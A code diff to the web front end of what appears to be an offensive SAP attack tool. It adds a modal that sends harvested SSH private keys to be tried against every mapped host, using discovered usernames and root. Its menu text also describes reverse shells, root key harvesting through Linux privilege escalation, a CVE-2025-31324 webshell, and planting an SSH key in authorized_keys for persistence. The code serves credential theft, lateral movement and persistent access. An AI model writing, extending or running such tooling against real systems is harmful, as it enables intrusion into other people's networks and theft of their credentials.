@@ -2040,6 +2040,24 @@ body {
   </div>
 </div>
 
+<!-- SSH Lateral Movement Key Selection Modal -->
+<div class="modal-overlay" id="ssh-lateral-modal">
+  <div class="modal" style="max-width:580px;width:95vw">
+    <h3>&#128640; SSH Lateral Movement</h3>
+    <div id="ssh-lateral-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
+    <div style="font-size:11px;color:#8b949e;margin-bottom:10px;line-height:1.5">
+      Select which harvested SSH private keys to test. Each selected key
+      will be tried against <strong>every node on the map</strong> using
+      discovered OS usernames (falls back to <code>root</code>).
+    </div>
+    <div id="ssh-lateral-keys-list" style="max-height:300px;overflow-y:auto;margin-bottom:12px"></div>
+    <div class="form-actions">
+      <button class="btn" onclick="closeModal('ssh-lateral-modal')">Cancel</button>
+      <button class="btn btn-primary" id="ssh-lateral-go-btn" onclick="submitSshLateral()">&#128640; Test Selected Keys</button>
+    </div>
+  </div>
+</div>
+
 <!-- AutoPwn Progress Panel — docked right, map stays visible -->
 <div class="autopwn-panel" id="autopwn-progress-panel">
   <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 16px 0 16px;flex-shrink:0">
@@ -4192,7 +4210,7 @@ function showCtxMenu(e, sid) {
     'reverse_shell':    'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), or CVE-2025-31324 webshell (Java)',
     'ssh_harvest':      'Requires OS-exec on a Linux host — reads /etc/passwd + .ssh dirs via GW SAPXPG, CVE-2025-31324, or SXPG_STEP_XPG_START',
     'ssh_harvest_root': 'Requires a viable Linux LPE (Copy Fail or Dirty Frag) — run "Escalate to Root" first. Reads ALL users\' .ssh directories as root.',
-    'ssh_test_keys':    'Requires OS-exec on a Linux host — harvests SSH keys first, then tests them against known targets',
+    'ssh_test_keys':    'Test previously harvested SSH keys against all map nodes — run SSH Harvest first',
     'ssh_plant_key':    'Requires OS-exec on a Linux host — plants SAPMAP ed25519 pubkey into authorized_keys for persistence',
     'harvest_scc':          'Requires OS-exec on this node AND an SCC on the same host IP',
     'harvest_scc_hashes_via_lpe':
@@ -5523,12 +5541,9 @@ async function ctxAction(action) {
       if (confirm(`Harvest SSH keys from ${sid} as ROOT?\n\nThis uses the Linux LPE (Copy Fail / Dirty Frag) to read ALL users' .ssh directories — not just the current sidadm user.\n\nResults are saved to loot/ssh/.`))
         await api('POST', `node/${sid}/ssh_harvest`, { channel: 'root' });
       break;
-    case 'ssh_test_keys': {
-      if (!confirm(`SSH Lateral Movement from ${sid}?\n\nThis will:\n1. Harvest SSH keys (if not already done)\n2. Test every key×target×username combination via SSH\n3. Report successful logins as CRITICAL findings\n\nTargets are derived from known_hosts files and the SAPMAP landscape.`))
-        break;
-      await api('POST', `node/${sid}/ssh_test_keys`);
+    case 'ssh_test_keys':
+      showSshLateralModal(sid);
       break;
-    }
     case 'ssh_plant_key': {
       const tu = prompt(`SSH Plant Key on ${sid}\n\nEnter the target OS username to plant the SAPMAP SSH public key into (e.g. sapadm, s4hadm).\n\nThis appends the SAPMAP ed25519 pubkey to ~user/.ssh/authorized_keys for persistent access.`, '');
       if (!tu) break;
@@ -7862,6 +7877,100 @@ async function submitPropagateTicket() {
     'info'
   );
   await api('POST', `node/${sid}/propagate_ticket`, body);
+  startPolling();
+}
+
+// ── SSH Lateral Movement key-selection modal ──────────────────────
+async function showSshLateralModal(sid) {
+  const n = (mapState.nodes || {})[sid];
+  if (!n) return;
+
+  document.getElementById('ssh-lateral-system-info').innerHTML =
+    '<strong>' + escHtml(n.sid) + '</strong> '
+    + '(' + escHtml(n.hostname || n.ip || '') + ')';
+
+  const listEl = document.getElementById('ssh-lateral-keys-list');
+  listEl.innerHTML = '<div style="color:#8b949e;font-size:11px">Loading harvested keys…</div>';
+  document.getElementById('ssh-lateral-go-btn').disabled = true;
+  document.getElementById('ssh-lateral-modal').classList.add('visible');
+
+  let data;
+  try {
+    data = await api('GET', 'node/' + sid + '/ssh_loot_keys');
+  } catch (e) {
+    listEl.innerHTML = '<div style="color:#f85149">Failed to fetch SSH loot data.</div>';
+    return;
+  }
+
+  const keys = (data && data.keys) || [];
+  const authKeys = (data && data.authorized_keys) || [];
+
+  if (keys.length === 0) {
+    let msg = '<div style="color:#f0883e;font-size:12px;line-height:1.6">'
+      + '&#9888; No harvested SSH private keys found for this node.<br>'
+      + 'Run <strong>SSH Key Harvest</strong> (or <strong>SSH Key Harvest as Root</strong>) first.';
+    if (authKeys.length > 0)
+      msg += '<br><br><span style="color:#8b949e">Note: ' + authKeys.length
+        + ' authorized_keys entries were found, but no private keys to test with.</span>';
+    msg += '</div>';
+    listEl.innerHTML = msg;
+    return;
+  }
+
+  document.getElementById('ssh-lateral-go-btn').disabled = false;
+  document.getElementById('ssh-lateral-modal')._osUsers = data.os_users || [];
+
+  let html = '<div style="margin-bottom:8px;font-size:11px;color:#8b949e">'
+    + keys.length + ' private key(s) found</div>';
+  keys.forEach(function(k, idx) {
+    const id = 'ssh-key-cb-' + idx;
+    html += '<label style="display:flex;align-items:center;gap:8px;padding:5px 8px;'
+      + 'border:1px solid #30363d;border-radius:4px;margin-bottom:4px;'
+      + 'background:#0d1117;cursor:pointer;font-size:12px;color:#c9d1d9">'
+      + '<input type="checkbox" id="' + id + '" checked '
+      + 'data-key-owner="' + escHtml(k.owner) + '" '
+      + 'data-key-path="' + escHtml(k.path) + '" '
+      + 'data-key-type="' + escHtml(k.type) + '" '
+      + 'style="accent-color:#3fb950;width:16px;height:16px;flex-shrink:0">'
+      + '<span><strong>' + escHtml(k.owner) + '</strong>'
+      + '<span style="color:#8b949e;margin-left:8px">' + escHtml(k.type) + '</span>'
+      + ' <span style="color:#484f58;font-size:10px">(' + (k.size||'?') + ' B)</span>'
+      + '<br><span style="font-size:10px;color:#484f58">' + escHtml(k.path) + '</span>'
+      + '</span></label>';
+  });
+  listEl.innerHTML = html;
+}
+
+async function submitSshLateral() {
+  const sid = selectedNodeSid;
+  if (!sid) return;
+
+  const keys = [];
+  document.querySelectorAll('#ssh-lateral-keys-list input[type=checkbox]:checked').forEach(function(cb) {
+    keys.push({
+      owner: cb.dataset.keyOwner,
+      path:  cb.dataset.keyPath,
+      type:  cb.dataset.keyType,
+    });
+  });
+
+  if (keys.length === 0) {
+    showToast('Select at least one SSH key to test.', 'warn');
+    return;
+  }
+
+  const osUsers = document.getElementById('ssh-lateral-modal')._osUsers || [];
+
+  closeModal('ssh-lateral-modal');
+  showToast(
+    '&#128640; Testing ' + keys.length + ' SSH key(s) from ' + escHtml(sid)
+    + ' against all map nodes — see console for per-target verdicts.',
+    'info'
+  );
+  await api('POST', 'node/' + sid + '/ssh_test_keys', {
+    keys: keys,
+    os_users: osUsers,
+  });
   startPolling();
 }
 
